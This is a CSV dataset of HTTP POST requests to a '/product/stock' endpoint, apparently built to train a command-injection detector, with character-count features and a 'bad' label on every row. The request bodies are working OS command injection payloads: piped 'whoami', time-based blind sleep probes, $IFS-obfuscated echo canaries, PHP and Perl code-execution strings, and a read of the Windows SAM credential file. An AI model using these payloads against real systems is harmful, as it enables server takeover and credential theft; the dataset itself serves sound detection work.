method,path,body,dashes,andsign,dolar,orsign,lessthan,greaterthan,exclamation,badwords,class
POST,/product/stock,"productId=2&storeId=1 ""&echo$IFSMYMGJG$((67+19))$(echo$IFSMYMGJG)MYMGJG",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '| [ 5 -ne $(echo JTXVKL | tr -d '\n' | wc -c) ] || sleep 1,0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 6 -ne $(echo EUILIT | tr -d '\n' | wc -c) ] || sleep 1 '",0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '||echo$IFSRQPTDA$((77+60))$(echo$IFSRQPTDA)RQPTDA|,0,0,4,3,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo PSDLXW)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi |",0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
echo SUTPRJ$((93+86))$(echo SUTPRJ)SUTPRJ\\",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 \n,0,0,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""echo$IFSTXEBDL$((98+30))$(echo$IFSTXEBDL)TXEBDL'",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo TNPFBA); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi ',0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ')print(`echo EHPKWP\necho $((79+86))\necho EHPKWP\necho EHPKWP`);//EHPKWP,0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | [ 4 -ne $(echo RUNALC | tr -d '\n' | wc -c) ] || sleep 1 \\,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo KPNBST$((18+29))$(echo KPNBST)KPNBST\,0,0,2,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "";echo IAFRMU$((45+79))$(echo IAFRMU)IAFRMU&",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
echo LJFJVH$((10+34))$(echo LJFJVH)LJFJVH\",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo VEMEGX$((63+29))$(echo VEMEGX)VEMEGX&,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo ZDEMVI) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 //",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSXSJZOO$((37+56))$(echo$IFSXSJZOO)XSJZOO,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 || perl -e 'print ""X""x16096'",0,0,0,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 %27,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "");}print(`echo XYXNLP\necho $((64+13))\necho XYXNLP\necho XYXNLP`);XYXNLP",0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 |echo TAQPYI$((0+30))$(echo TAQPYI)TAQPYI',0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo$IFSYBFPVK$((15+44))$(echo$IFSYBFPVK)YBFPVK\\",0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 3 -ne $(echo CVUCAT | tr -d '\n' | wc -c) ] || sleep 1 ',0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&echo TSJQIY$((55+20))$(echo TSJQIY)TSJQIY//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "" echo KBNUFV$((78+52))$(echo KBNUFV)KBNUFV|",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ${passthru(print(`echo XUWNEP;echo $((61+20));echo XUWNEP;echo XUWNEP`);.%27XUWNEP,0,0,2,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&&echo$IFSLRQJZI$((98+24))$(echo$IFSLRQJZI)LRQJZI&,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSILKQLY$((38+92))$(echo$IFSILKQLY)ILKQLY&,0,0,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "";echo SQMNBY$((85+74))$(echo SQMNBY)SQMNBY""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | [ 2 -ne $(echo CXWPXJ | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&echo$IFSDXNLEZ$((56+76))$(echo$IFSDXNLEZ)DXNLEZ//,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo FPLFHR)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi \\",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo LVVACM) && str1=${#str} && [ 8 -eq ${str1} ] && sleep 1 //,0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ||echo AHERUV$((2+2))$(echo AHERUV)AHERUV""",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo JQKYOJ$((43+35))$(echo JQKYOJ)JQKYOJ',0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo VZETTM) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 &,0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo ZSGSGJ)
 str1=${#str}
 if [ 5 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi //",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSZIARXP$((32+15))$(echo$IFSZIARXP)ZIARXP\\,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 <?php system(""sleep 10"");?>",0,0,0,0,1,1,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 print(`echo DAESAZ\necho $((6+17))\necho DAESAZ\necho DAESAZ`);%25255C%25255CDAESAZ,0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo FXPFKU) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 %26,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 {${sleep(3)}},0,0,1,0,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo$IFSUSGSMP$((39+12))$(echo$IFSUSGSMP)USGSMP'",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | type C:\WINNT\repair\SAM,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo WMETWL$((1+53))$(echo WMETWL)WMETWL,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo$IFSUDIYDY$((28+5))$(echo$IFSUDIYDY)UDIYDY""",0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSLXLUOD$((68+51))$(echo$IFSLXLUOD)LXLUOD,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ';echo$IFSYYDENG$((25+38))$(echo$IFSYYDENG)YYDENG//,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo FWEHDM) && str1=${#str} && [ 6 -eq ${str1} ] && sleep 1 ',0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo PSUJGU); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi //,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 'echo OLRHZX$((22+72))$(echo OLRHZX)OLRHZX//,0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""echo$IFSJUCOSG$((27+40))$(echo$IFSJUCOSG)JUCOSG'",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 & sleep 0 && str=$(echo VGAFPT) && str1=${#str} && [ 3 -eq ${str1} ] && sleep 1 """,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '|echo$IFSQMGDOR$((26+14))$(echo$IFSQMGDOR)QMGDOR\,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '.print(`echo SMJBZB
echo $((19+71))
echo SMJBZB
echo SMJBZB`);//SMJBZB",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ' echo KSLOZF$((6+29))$(echo KSLOZF)KSLOZF,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 4 -ne $(echo GBBAUV | tr -d '\n' | wc -c) ] || sleep 1",0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 'echo$IFSENOPZR$((31+41))$(echo$IFSENOPZR)ENOPZR&,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '|echo$IFSOJYTMR$((97+63))$(echo$IFSOJYTMR)OJYTMR,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
 str=$(echo VYCNRP)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSJNIADE$((97+6))$(echo$IFSJNIADE)JNIADE\,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo UXESAW) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1 %27,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo MXMWUR$((62+86))$(echo MXMWUR)MXMWUR//,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & ls -l /,0,0,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '|echo$IFSTBYTAT$((44+46))$(echo$IFSTBYTAT)TBYTAT|,0,0,4,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo YCSCIW)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi //",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""
echo SMCVFB$((37+17))$(echo SMCVFB)SMCVFB",0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo IRSLRF$((35+88))$(echo IRSLRF)IRSLRF""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSOKJGAG$((39+76))$(echo$IFSOKJGAG)OKJGAG,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo TYPSKV)
 str1=${#str}
 if [ 6 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %27",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSBHTKLO$((25+57))$(echo$IFSBHTKLO)BHTKLO\,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo KFLFGL$((10+4))$(echo KFLFGL)KFLFGL\\,0,0,2,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ${system(print(`echo MAFXYF
echo $((23+63))
echo MAFXYF
echo MAFXYF`);//MAFXYF",0,0,2,0,0,0,0,6,bad
POST,/product/stock,"productId=2&storeId=1 &&echo$IFSHHBLVW$((31+45))$(echo$IFSHHBLVW)HHBLVW""",0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | [ 3 -ne $(echo SQHKCG | tr -d '\n' | wc -c) ] || sleep 1 &,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "".print(`echo MFYSPW;echo $((87+75));echo MFYSPW;echo MFYSPW`);%23MFYSPW",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSKNVVGI$((69+44))$(echo$IFSKNVVGI)KNVVGI&,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ; sleep 5,0,0,0,0,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
echo LLPOAO$((93+93))$(echo LLPOAO)LLPOAO",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 print(`echo ADZJNM`.`echo $((71+71))`.`echo ADZJNM`.`echo ADZJNM`);\\ADZJNM,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1  echo HYDGEB$((71+9))$(echo HYDGEB)HYDGEB,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 |echo MAVZWG$((0+81))$(echo MAVZWG)MAVZWG""",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & system('sleep 5');,0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
echo MGXPRT$((51+4))$(echo MGXPRT)MGXPRT&",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo LOAKXY$((52+22))$(echo LOAKXY)LOAKXY&,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 2 -ne $(echo XWWMIW | tr -d '\n' | wc -c) ] || sleep 1 #",0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo ANEUHZ$((23+22))$(echo ANEUHZ)ANEUHZ//",0,0,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo LMRVVK)
 str1=${#str}
 if [ 1 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi '",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ${system(print(`echo CZASPT\necho $((18+64))\necho CZASPT\necho CZASPT`);.%252522CZASPT,0,0,2,0,0,0,0,9,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 1 -ne $(echo GBBAUV | tr -d '\n' | wc -c) ] || sleep 1",0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo NWAYIZ) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 \\",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1  echo HBFEEM$((46+2))$(echo HBFEEM)HBFEEM',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '||echo$IFSUBXJUF$((52+61))$(echo$IFSUBXJUF)UBXJUF,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
echo BLZAZS$((67+95))$(echo BLZAZS)BLZAZS""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo FXPFKU) && str1=${#str} && [ 1 -eq ${str1} ] && sleep 1 %26,0,4,3,0,0,0,0,3,bad
